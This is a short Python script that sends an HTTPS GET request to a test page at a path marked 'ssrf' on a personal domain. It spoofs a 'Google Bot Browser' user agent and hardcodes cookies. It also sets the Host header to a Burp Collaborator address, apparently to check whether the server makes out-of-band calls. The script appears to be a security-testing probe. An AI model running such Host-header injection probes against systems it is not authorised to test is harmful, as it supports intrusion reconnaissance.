# -*- coding: utf-8 -*-

import http.client

connection = http.client.HTTPSConnection("www.damianschwyrz.de")
# connection.set_tunnel("www.damianschwyrz.de")
connection.request("GET", "https://www.damianschwyrz.de/s3cr3tZ/ssrf/test.php", None, {
    "Content-type": "text/html",
    "Accept": "text/html",
    "User-Agent": "Google Bot Browser",
    "Host": "yqs3h4bc6pslcg53bkydzxs2jtpkd9.burpcollaborator.net",
    "Cookie": "damian=123; eddy=321"
})
response = connection.getresponse()

print(response.read())
connection.close()
